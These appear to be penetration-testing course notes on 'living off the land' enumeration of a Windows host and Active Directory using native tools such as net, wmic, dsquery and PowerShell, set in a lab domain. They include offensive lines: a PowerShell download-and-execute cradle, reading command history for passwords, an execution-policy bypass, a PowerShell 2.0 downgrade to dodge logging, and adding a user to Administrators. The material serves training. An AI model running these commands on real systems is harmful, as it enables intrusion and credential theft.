# 🏴‍☠️ 1. Living Off the Land

> [!info]  
> **Living Off the Land (LotL)** means performing enumeration, discovery, and other assessment activities using tools and functionality that are **already present on the Windows host**, rather than uploading custom tools or bringing an external attack host into the environment.
> 
> In an AD assessment, this is especially useful when:
> 
> - The compromised/managed host has **no Internet access**
>     
> - Uploading tools is prevented
>     
> - The client wants to test what can be discovered using only native functionality
>     
> - We want to minimize the number of external binaries introduced into the environment
>     
> - We need to understand what an attacker can accomplish using standard Windows/AD functionality
>     

> [!important]  
> **LotL does NOT mean "undetectable."**
> 
> Native tools can still generate process, command-line, PowerShell, network, and authentication telemetry. Some environments specifically monitor commands such as `whoami`, `net`, PowerShell activity, WMI, and other administrative utilities.

---

# 💻 2. Command Cheat Sheet

|Command|What it does|
|---|---|
|`hostname`|Displays the current computer's hostname.|
|`[System.Environment]::OSVersion.Version`|Displays the Windows OS version and revision.|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Lists installed patches and hotfixes.|
|`ipconfig /all`|Displays detailed network adapter configuration.|
|`set`|Displays CMD environment variables.|
|`echo %USERDOMAIN%`|Displays the current user's domain.|
|`echo %logonserver%`|Displays the domain controller used by the host.|
|`systeminfo`|Displays a consolidated summary of system and OS information.|
|`Get-Module`|Lists PowerShell modules available/loaded in the session.|
|`Get-ExecutionPolicy -List`|Displays PowerShell execution-policy settings for each scope.|
|`Set-ExecutionPolicy Bypass -Scope Process`|Bypasses execution policy only for the current PowerShell process.|
|`Get-ChildItem Env: \| ft Key,Value`|Displays PowerShell environment variables in a readable table.|
|`Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|Reads the PowerShell command history file.|
|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <follow-on commands>"`|Downloads and executes PowerShell content in memory; requires network access to the URL.|
|`Get-Host`|Displays information about the current PowerShell host and version.|
|`powershell.exe -version 2`|Attempts to start Windows PowerShell using version 2.0.|
|`netsh advfirewall show allprofiles`|Displays Windows Firewall status and configuration for all profiles.|
|`sc query windefend`|Queries the Windows Defender service status.|
|`Get-MpComputerStatus`|Displays detailed Microsoft Defender status and configuration information.|
|`qwinsta`|Displays currently active and disconnected terminal sessions.|
|`arp -a`|Displays entries currently known in the ARP cache.|
|`route print`|Displays IPv4/IPv6 routing tables and known network paths.|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays detailed computer-system information.|
|`wmic process list /format:list`|Lists running processes and their properties.|
|`wmic ntdomain list /format:list`|Displays domain and domain-controller information.|
|`wmic useraccount list /format:list`|Lists local/domain account information associated with the host.|
|`wmic group list /format:list`|Lists local groups.|
|`wmic sysaccount list /format:list`|Displays system/service account information.|
|`wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress`|Queries domain, forest, and domain-controller information.|
|`net accounts`|Displays local password/account policy information.|
|`net accounts /domain`|Displays domain password and account-lockout policy.|
|`net group /domain`|Lists groups in the domain.|
|`net group "Domain Admins" /domain`|Lists members of Domain Admins.|
|`net group "domain computers" /domain`|Lists domain computer accounts.|
|`net group "Domain Controllers" /domain`|Lists domain-controller computer accounts.|
|`net group <domain_group_name> /domain`|Displays members of a specified domain group.|
|`net groups /domain`|Lists domain groups.|
|`net localgroup`|Lists local groups.|
|`net localgroup administrators /domain`|Displays members of the domain administrators group.|
|`net localgroup Administrators`|Displays members of the local Administrators group.|
|`net localgroup administrators [username] /add`|Adds a user to the local Administrators group.|
|`net share`|Lists shares exposed by the current host.|
|`net user <ACCOUNT_NAME> /domain`|Displays information about a domain user.|
|`net user /domain`|Lists domain users.|
|`net user %username%`|Displays information about the current user.|
|`net use x: \\computer\share`|Maps a remote share to a local drive letter.|
|`net view`|Lists visible computers.|
|`net view /all /domain[:domainname]`|Displays available domain resources/shares.|
|`net view \\computer /ALL`|Lists shares on a specific computer.|
|`net view /domain`|Lists computers in a domain.|
|`net1`|Native executable that provides functionality equivalent to many `net` commands.|
|`dsquery user`|Queries AD for user objects.|
|`dsquery computer`|Queries AD for computer objects.|
|`dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"`|Performs a wildcard query for objects under a specified AD container.|
|`dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl`|Searches for user objects matching the `PASSWD_NOTREQD` UAC bit.|
|`dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName`|Searches for domain controllers using the UAC `SERVER_TRUST_ACCOUNT` bit.|
|`whoami`|Displays the current security context/user identity.|

---

# 🧭 3. Tool Roles & Differences

|Tool / Technique|Main purpose|Mental model|
|---|---|---|
|`systeminfo`|Broad host/system enumeration|🖥️ **"Tell me about this machine."**|
|PowerShell|Flexible native Windows administration and enumeration|🧰 **"Use the Windows scripting framework."**|
|`netsh`|Network/firewall configuration and inspection|🧱 **"What is the host's network defense state?"**|
|`sc`|Windows service management/querying|⚙️ **"What services are running?"**|
|`qwinsta`|Session discovery|👤 **"Who is currently using this machine?"**|
|`arp`|Local network-neighbor discovery|📡 **"Who has this host recently talked to?"**|
|`route`|Routing/network-segment discovery|🗺️ **"What networks can this machine reach?"**|
|WMI|Structured Windows/local/remote system and AD information|🔎 **"Query Windows management data."**|
|`net` / `net1`|Native domain/user/group/share enumeration|🏢 **"Ask Windows/AD basic administrative questions."**|
|`dsquery`|LDAP-style AD object discovery/filtering|🔍 **"Search AD objects directly."**|
|LDAP filters|Precise AD attribute/object matching|🎯 **"Find objects matching exact conditions."**|

## 🧠 The Big Picture

```text
                 WINDOWS FOOTHOLD
                        │
                        ↓
               🖥️ HOST ENUMERATION
                        │
          ┌─────────────┼─────────────┐
          ↓             ↓             ↓
      systeminfo     PowerShell      WMI
          │             │             │
          └─────────────┼─────────────┘
                        ↓
                🌐 NETWORK ENUMERATION
                        │
             ┌──────────┴──────────┐
             ↓                     ↓
          arp -a                route print
             │                     │
             └──────────┬──────────┘
                        ↓
                 🏢 DOMAIN ENUMERATION
                        │
             ┌──────────┼──────────┐
             ↓          ↓          ↓
            net       WMI      dsquery
             │          │          │
             └──────────┼──────────┘
                        ↓
                🧩 CORRELATE DATA
                        │
                        ↓
               🎯 IDENTIFY TARGETS
                        │
                        ↓
               🛠️ NEXT TECHNIQUE
```

### 🔎 The Important Distinction

```text
PowerShell
   ↓
GENERAL WINDOWS SCRIPTING / ADMINISTRATION
   │
   ├── Host enumeration
   ├── Network enumeration
   ├── AD queries
   └── File/script operations

WMI
   ↓
WINDOWS MANAGEMENT DATA
   │
   ├── Processes
   ├── Accounts
   ├── Domain information
   └── System information

net / net1
   ↓
BASIC WINDOWS + DOMAIN ADMINISTRATION
   │
   ├── Users
   ├── Groups
   ├── Computers
   ├── Shares
   └── Policies

dsquery
   ↓
DIRECT AD OBJECT SEARCHING
   │
   ├── Users
   ├── Computers
   ├── Groups
   ├── OUs
   └── Attribute-based LDAP filters
```

> [!important]  
> The key idea is **not memorizing dozens of unrelated commands**.
> 
> Think about the **question you are trying to answer**, then choose the native tool capable of answering it.

---

# 🎯 4. Why Living Off the Land Matters

A typical engagement may begin with a foothold on a Windows host.

Normally, we might bring tools such as PowerView, SharpHound, or other enumeration utilities onto the host.

With LotL:

```text
FOOTHOLD
   ↓
❌ Can't upload tools
❌ No Internet
❌ No external attack host
   ↓
🪟 USE NATIVE WINDOWS FUNCTIONALITY
   ↓
PowerShell / WMI / net / dsquery / systeminfo
   ↓
ENUMERATE HOST + NETWORK + AD
```

### 🧠 Mental Model

> **"If I cannot bring my toolbox to the machine, what tools does the machine already have?"**

Windows itself contains a surprisingly large amount of functionality useful for enumeration.

---

# 🖥️ 5. Host & Environment Enumeration

The first objective after obtaining a foothold is to understand **where we are**.

Important questions:

```text
🖥️ What machine am I on?
       ↓
💿 What OS/version?
       ↓
🩹 What patches are installed?
       ↓
🌐 What networks/interfaces exist?
       ↓
🏢 What domain am I joined to?
       ↓
🎫 Which DC do I communicate with?
       ↓
👤 Which user/security context am I running as?
```

## 🔎 5.1 Basic Enumeration Commands

|**CommandResult**||
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|

## 🧰 5.2 `systeminfo`

[systeminfo]([Microsoft systeminfo documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo?utm_source=chatgpt.com)) consolidates much of the basic host information into one command.

```cmd
systeminfo
```

Instead of running many individual commands, `systeminfo` provides a broad summary of the host.

> [!tip]  
> From a methodology perspective, `systeminfo` is useful during the **initial host triage** phase because it quickly answers many basic questions before deeper enumeration begins.

---

# 🧰 6. Harnessing PowerShell

[PowerShell]([Microsoft PowerShell documentation](https://learn.microsoft.com/en-us/powershell/?utm_source=chatgpt.com)) is much more than a command shell.

It is a scripting and administration framework deeply integrated into Windows.

For CPTS purposes, think of PowerShell as:

```text
PowerShell
    ↓
Native Windows scripting framework
    ↓
┌──────────────┬──────────────┬───────────────┐
│ Host Recon   │ AD Recon     │ File Operations│
├──────────────┼──────────────┼───────────────┤
│ Environment  │ Modules      │ History       │
│ OS details   │ AD objects   │ Downloads     │
│ Processes    │ Domain info  │ Scripts       │
└──────────────┴──────────────┴───────────────┘
```

## 🔎 6.1 Useful PowerShell Commands

|**Cmd-LetDescription**||
|---|---|
|`Get-Module`|Lists available modules loaded for use.|
|`Get-ExecutionPolicy -List`|Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.|
|`Set-ExecutionPolicy Bypass -Scope Process`|This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.|
|`Get-ChildItem Env: \| ft Key,Value`|Return environment values such as key paths, users, computer information, etc.|
|`Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.|
|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`|This is a quick and easy way to download a file from the web using PowerShell and call it from memory.|

## 🧠 PowerShell Enumeration Mental Model

```text
Get-Module
    ↓
"What functionality is available?"

Get-ExecutionPolicy -List
    ↓
"What execution-policy restrictions exist?"

Get-ChildItem Env:
    ↓
"What does the current environment reveal?"

ConsoleHost_history.txt
    ↓
"What commands did this user previously execute?"

whoami
    ↓
"Which security context am I operating under?"
```

---

# 🔍 7. Reading the PowerShell Environment

The example session revealed:

```powershell
whoami
```

Output:

```text
nt authority\system
```

This is a critical finding.

> [!important]  
> `NT AUTHORITY\SYSTEM` is the local Windows SYSTEM security context. Discovering this immediately changes how we think about the foothold because we are operating with a highly privileged local context.

The environment variables also revealed information such as:

```text
COMPUTERNAME
USERDOMAIN
USERNAME
USERPROFILE
SystemRoot
SystemDrive
Path
PSModulePath
PROCESSOR_ARCHITECTURE
```

For example:

```text
COMPUTERNAME    ACADEMY-EA-MS01
USERDOMAIN      INLANEFREIGHT
USERNAME        ACADEMY-EA-MS01$
```

The `$` on the username is significant because computer accounts in AD conventionally end in `$`.

---

# 📜 8. PowerShell History

PowerShell command history can sometimes contain valuable information.

```powershell
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

Possible information exposed by history includes:

```text
Previous commands
      ↓
Configuration paths
      ↓
Scripts executed
      ↓
Administrative actions
      ↓
Potential credentials/secrets
```

> [!warning]  
> Command history should **not automatically be assumed to contain passwords**. It is simply another source of information worth checking during credentialed enumeration.

---

# ⚙️ 9. PowerShell Execution Policy

Check the policies:

```powershell
Get-ExecutionPolicy -List
```

Example:

```text
        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine    RemoteSigned
```

A process-scoped policy can be changed with:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

The important concept is:

```text
-Scope Process
      ↓
Affects only current PowerShell process
      ↓
Process exits
      ↓
Setting does not persist
```

> [!important]  
> Execution Policy is **not a security boundary equivalent to application allowlisting or EDR**. It primarily controls how PowerShell scripts are executed and can often be bypassed in various ways.

---

# 🕵️ 10. PowerShell Versions & Logging

The source demonstrates an older technique involving PowerShell 2.0.

Check the current version:

```powershell
Get-Host
```

Example:

```text
Name             : ConsoleHost
Version          : 5.1.19041.1320
```

The example then attempts:

```powershell
powershell.exe -version 2
```

and checks again:

```powershell
Get-Host
```

Example:

```text
Name             : ConsoleHost
Version          : 2.0
```

## 🧠 Why This Matters

PowerShell logging capabilities evolved significantly beginning with PowerShell 3.0 and later versions.

The module demonstrates that older PowerShell versions historically lacked some of the logging capabilities introduced in newer versions.

Relevant logs include:

```text
Applications and Services Logs
    └── Microsoft
        └── Windows
            └── PowerShell
                └── Operational
```

and:

```text
Applications and Services Logs
    └── Windows PowerShell
```

The source specifically discusses **Script Block Logging** and Event ID `4104`.

> [!warning]  
> **CPTS accuracy point:** Do not memorize this as "PowerShell 2 = invisible."
> 
> Modern Windows environments may remove/disable PowerShell 2.0, and security products can collect telemetry independently of PowerShell's native logging. The downgrade itself can also generate evidence.

### 🧠 Detection Mental Model

```text
Normal PowerShell
      ↓
Commands executed
      ↓
PowerShell logging / EDR telemetry
      ↓
Defender sees activity

Attempt PowerShell v2
      ↓
powershell.exe -version 2
      ↓
The downgrade command itself may be logged
      ↓
Older session has reduced native logging capability
      ↓
BUT
      ↓
Other telemetry may still exist
```

> [!important]  
> The source explicitly points out that the command used to launch PowerShell 2.0 is itself visible in the logs. Therefore, the technique is **not evidence-free**.

---

# 🧱 11. Checking Host Defenses

Before performing more intrusive enumeration, it can be useful to understand the host's defensive state.

The main native tools demonstrated are:

```text
netsh
  ↓
Firewall configuration

sc
  ↓
Service state

Get-MpComputerStatus
  ↓
Microsoft Defender configuration/status
```

---

# 🔥 12. Windows Firewall Enumeration

[netsh]([Microsoft netsh documentation](https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts?utm_source=chatgpt.com)) can inspect firewall configuration.

```cmd
netsh advfirewall show allprofiles
```

The command displays:

```text
Domain Profile
Private Profile
Public Profile
```

and information such as:

```text
State
Firewall Policy
LocalFirewallRules
RemoteManagement
Logging
LogAllowedConnections
LogDroppedConnections
Firewall log path
```

Example from the source:

```text
Domain Profile Settings:
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
...
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
```

### 🧠 Why Check This?

```text
Firewall state
     ↓
Can affect inbound/outbound communication
     ↓
Helps understand host network restrictions
     ↓
Can influence later enumeration/pivoting decisions
```

---

# 🛡️ 13. Windows Defender Enumeration

## 🔎 13.1 Check Defender Service

[sc]([Microsoft sc.exe documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query?utm_source=chatgpt.com)) can query Windows services.

```cmd
sc query windefend
```

Example:

```text
SERVICE_NAME: windefend
TYPE               : 10  WIN32_OWN_PROCESS
STATE              : 4  RUNNING
```

This tells us the Defender service is running.

---

## 🔎 13.2 Detailed Defender Status

[Get-MpComputerStatus]([Microsoft Defender Get-MpComputerStatus documentation](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?utm_source=chatgpt.com)) provides much more detail:

```powershell
Get-MpComputerStatus
```

Useful fields include:

```text
AMRunningMode
AMServiceEnabled
AntispywareEnabled
AntivirusEnabled
BehaviorMonitorEnabled
DefenderSignaturesOutOfDate
IoavProtectionEnabled
IsTamperProtected
FullScanAge
LastQuickScanSource
```

Example:

```text
AMRunningMode                    : Normal
AMServiceEnabled                : True
AntispywareEnabled              : True
AntivirusEnabled                : True
BehaviorMonitorEnabled          : True
DefenderSignaturesOutOfDate     : False
IoavProtectionEnabled           : True
IsTamperProtected               : True
```

> [!tip]  
> For a penetration test, defensive enumeration is useful for **situational awareness and reporting**. It tells us what security controls are present and can also identify defensive configuration gaps that should be reported to the client.

---

# 👥 14. Am I Alone?

After obtaining a foothold, determine whether another user is actively using the machine.

Why?

```text
Someone else is logged in
        ↓
You perform enumeration/actions
        ↓
User sees unexpected behavior
        ↓
Potential report to IT/security
        ↓
Possible password change / session termination
        ↓
Foothold may be lost
```

## 🔎 14.1 `qwinsta`

```cmd
qwinsta
```

Example:

```text
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
```

The important information is:

- `USERNAME` → who is associated with the session
    
- `ID` → session identifier
    
- `STATE` → active/disconnected/listening
    
- `console` → local console session
    
- `rdp-tcp` → RDP listener/session information
    

> [!important]  
> Before interacting heavily with a foothold, **know whether someone is actively using it**.

---

# 🌐 15. Network Information

Once the host itself is understood, the next question is:

> **"What does this machine know about the network?"**

The source highlights:

|**Networking CommandsDescription**||
|---|---|
|`arp -a`|Lists all known hosts stored in the arp table.|
|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|
|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|`netsh advfirewall show allprofiles`|Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|

---

# 📡 16. ARP Enumeration

```cmd
arp -a
```

ARP provides information about IP addresses and their corresponding MAC addresses that are currently known by the host.

Example:

```text
Interface: 172.16.5.25 --- 0x8
  Internet Address      Physical Address      Type
  172.16.5.5            00-50-56-b9-08-26     dynamic
  172.16.5.130          00-50-56-b9-f0-e1     dynamic
  172.16.5.240          00-50-56-b9-9d-66     dynamic
```

This gives us potential nearby hosts such as:

```text
172.16.5.5
172.16.5.130
172.16.5.240
```

### 🧠 ARP Mental Model

```text
ARP CACHE
   ↓
"What IP/MAC neighbors does this host currently know?"
   ↓
Potential nearby systems
   ↓
Candidate hosts for further investigation
```

> [!warning]  
> ARP is **not a complete network inventory**. An absent host does not mean the host does not exist. It simply means the relevant mapping is not currently present in the ARP cache.

---

# 🗺️ 17. Routing Table Enumeration

```cmd
route print
```

This displays IPv4 and IPv6 routes.

Example:

```text
Network Destination        Netmask          Gateway       Interface
0.0.0.0                     0.0.0.0         172.16.5.1    172.16.5.25
0.0.0.0                     0.0.0.0         10.129.0.1    10.129.201.234
10.129.0.0                  255.255.0.0     On-link       10.129.201.234
172.16.4.0                  255.255.254.0   On-link       172.16.5.25
```

### 🧠 Routing Mental Model

```text
route print
     ↓
What networks does this host know how to reach?
     ↓
Network interfaces
     ↓
Gateways
     ↓
Directly connected networks
     ↓
Potentially reachable internal segments
```

This is especially important during pivoting.

```text
FOOTHOLD
   │
   ├── 172.16.4.0/23
   │
   └── 10.129.0.0/16
          ↓
     Additional network
          ↓
     Potential pivot path
```

> [!important]  
> A routing table does **not automatically prove that every host in a listed network is reachable or that the network contains useful targets**. It tells us that the host has a route for that network.

---

# 🧭 18. `arp -a` vs `route print`

|Question|Command|Mental model|
|---|---|---|
|Which nearby IP/MAC mappings does this host know?|`arp -a`|📡 **Known neighbors**|
|Which networks can this host route traffic toward?|`route print`|🗺️ **Known paths**|
|What interfaces/IPs does this host have?|`ipconfig /all`|🌐 **My network identity**|
|Is Windows Firewall enabled?|`netsh advfirewall show allprofiles`|🧱 **My network defense**|

### 🎯 CPTS Pivoting Connection

```text
INITIAL FOOTHOLD
      ↓
ipconfig /all
      ↓
Understand interfaces/subnets
      ↓
arp -a
      ↓
Find known nearby systems
      ↓
route print
      ↓
Find additional reachable networks
      ↓
🧩 IDENTIFY PIVOT OPPORTUNITIES
```

This methodology applies beyond AD and is useful during general internal-network assessments.

---

# 🪟 19. Windows Management Instrumentation (WMI)

[Windows Management Instrumentation (WMI)]([Microsoft WMI documentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/about-wmi?utm_source=chatgpt.com)) is a Windows management framework used to retrieve information and perform administrative tasks locally and remotely.

For CPTS, think:

> **WMI = structured access to Windows management information.**

It can expose information about:

- Operating systems
    
- Processes
    
- Users
    
- Groups
    
- Domains
    
- Domain controllers
    
- System accounts
    
- Installed patches
    
- Other Windows management data
    

---

# 🔎 20. Quick WMI Checks

|**CommandDescription**||
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|
|`wmic process list /format:list`|A listing of all processes on host|
|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|
|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|
|`wmic group list /format:list`|Information about all local groups|
|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|

> [!important]  
> The `wmic` command-line utility is **deprecated on modern Windows versions**. The underlying WMI technology remains important, and newer systems may use PowerShell/CIM interfaces instead.

---

# 🏢 21. WMI Domain Enumeration

The source uses:

```cmd
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

Example:

```text
Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
```

This demonstrates why WMI can be useful for understanding:

```text
Current domain
      ↓
Forest
      ↓
Child domains / related domains
      ↓
Domain controllers
      ↓
Trust/environment relationships
```

---

# 🏢 22. Net Commands

[net.exe]([Microsoft net command documentation](https://learn.microsoft.com/en-us/windows/win32/winsock/net-exe-2?utm_source=chatgpt.com)) provides many built-in commands for querying and managing Windows/domain resources.

Useful enumeration categories include:

```text
👤 Users
👥 Groups
🖥️ Computers
🏢 Domains
🎫 Domain Controllers
🔐 Password policies
📂 Shares
```

---

# 🧭 23. Net Commands — Role & Difference

```text
net accounts
     ↓
Password/account policy

net user
     ↓
User information

net group
     ↓
Domain group information

net localgroup
     ↓
Local group information

net view
     ↓
Computers/shares

net share
     ↓
Local shares
```

> [!warning]  
> `net.exe` commands can be monitored by EDR/security tooling. Native does **not** mean invisible.

---

# 📊 24. Useful Net Commands

|**CommandDescription**||
|---|---|
|`net accounts`|Information about password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|Information about domain groups|
|`net group "Domain Admins" /domain`|List users with domain admin privileges|
|`net group "domain computers" /domain`|List of PCs connected to the domain|
|`net group "Domain Controllers" /domain`|List PC accounts of domains controllers|
|`net group <domain_group_name> /domain`|User that belongs to the group|
|`net groups /domain`|List of domain groups|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
|`net localgroup Administrators`|Information about a group (admins)|
|`net localgroup administrators [username] /add`|Add user to administrators|
|`net share`|Check current shares|
|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|
|`net user /domain`|List all users of the domain|
|`net user %username%`|Information about the current user|
|`net use x: \computer\share`|Mount the share locally|
|`net view`|Get a list of computers|
|`net view /all /domain[:domainname]`|Shares on the domains|
|`net view \computer /ALL`|List shares of a computer|
|`net view /domain`|List of PCs of the domain|

---

# 🔎 25. Listing Domain Groups

```cmd
net group /domain
```

The command contacts a domain controller:

```text
The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.
```

and returns domain groups such as:

```text
Accounting
Billing
Contractors
Domain Admins
...
```

### 🧠 Question Being Answered

```text
net group /domain
       ↓
"What groups exist in this domain?"
       ↓
Potentially interesting groups
       ↓
Query specific groups
       ↓
Identify users / privileges
```

---

# 👤 26. Enumerating a Domain User

```cmd
net user /domain wrouse
```

Example information includes:

```text
User name                    wrouse
Full Name                    Christopher Davis
Account active               Yes
Account expires              Never
Password last set            10/27/2021 10:38:01 AM
Password expires             Never
Password required            Yes
Workstations allowed         All
Last logon                   Never
Logon hours allowed          All
```

It also reveals group memberships:

```text
Global Group memberships
    *File Share G Drive
    *File Share H Drive
    *Warehouse
    *Printer Access
    *Domain Users
    *VPN Users
    *Shared Calendar Read
```

### 🧠 Why Group Membership Matters

```text
USER
 ↓
GROUP MEMBERSHIP
 ↓
ACCESS / PRIVILEGES
 ↓
RESOURCES
```

This is one of the core ideas behind AD enumeration.

---

# 🧩 27. `net` vs `net1`

The source demonstrates using:

```cmd
net1
```

instead of:

```cmd
net
```

because `net1.exe` provides similar functionality.

> [!warning]  
> Do **not** interpret this as a reliable EDR bypass.
> 
> Security products can detect the executable, command-line behavior, parent/child process relationship, API activity, or resulting network behavior rather than simply matching the literal string `net`.

### 🧠 Mental Model

```text
net
 ↓
Windows networking/admin functionality

net1
 ↓
Related native executable
 ↓
Similar functionality
```

The important CPTS lesson is that **different native binaries can expose similar functionality**, but changing the command name does not guarantee stealth.

---

# 🔍 28. Dsquery

[dsquery]([Microsoft dsquery documentation](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)?utm_source=chatgpt.com)) is a native command-line utility for searching Active Directory objects.

The key difference from basic `net` commands is:

```text
net
 ↓
Convenient administrative queries

dsquery
 ↓
AD object searching
 ↓
LDAP-style filtering
 ↓
More precise object selection
```

The source highlights `dsquery` because it can be available even when common offensive enumeration tools such as PowerView or BloodHound are unavailable.

---

# 🧬 29. Why Dsquery Matters for LotL

Imagine:

```text
❌ PowerView unavailable
❌ BloodHound unavailable
❌ SharpHound unavailable
❌ External tools blocked
```

But:

```text
Windows + AD functionality
          ↓
      dsquery
          ↓
      AD objects
          ↓
      LDAP filters
          ↓
      Targeted enumeration
```

That is the essence of **Living Off the Land**.

---

# 👤 30. Searching for Users

```cmd
dsquery user
```

Example:

```text
"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
```

The results are **Distinguished Names (DNs)**.

A DN describes an object's location in the AD hierarchy.

Example:

```text
CN=Annie Vazquez,
OU=Finance,
OU=Financial-LON,
OU=Employees,
OU=Corp,
DC=INLANEFREIGHT,
DC=LOCAL
```

Read it conceptually as:

```text
Forest/domain
   ↓
Domain
   ↓
OU=Corp
   ↓
OU=Employees
   ↓
OU=Financial-LON
   ↓
OU=Finance
   ↓
User = Annie Vazquez
```

---

# 🖥️ 31. Searching for Computers

```cmd
dsquery computer
```

Example:

```text
"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
```

This provides both:

1. The computer name
    
2. Its location within the AD hierarchy
    

That second piece can be very useful.

For example:

```text
SQL01
  ↓
OU=SQL Servers
  ↓
OU=Servers
  ↓
OU=Computers
  ↓
OU=Corp
```

Immediately tells us that `SQL01` is categorized as a SQL server.

---

# 🃏 32. Dsquery Wildcard Search

```cmd
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

This searches for objects under the specified container.

Example results include:

```text
CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

### 🧠 Mental Model

```text
dsquery user
     ↓
Find USER objects

dsquery computer
     ↓
Find COMPUTER objects

dsquery *
     ↓
Search AD objects broadly
     ↓
Add LDAP filters
     ↓
Find exactly what we want
```

---

# 🎯 33. LDAP Filtering

The real power of `dsquery` appears when LDAP filters are introduced.

Example:

```cmd
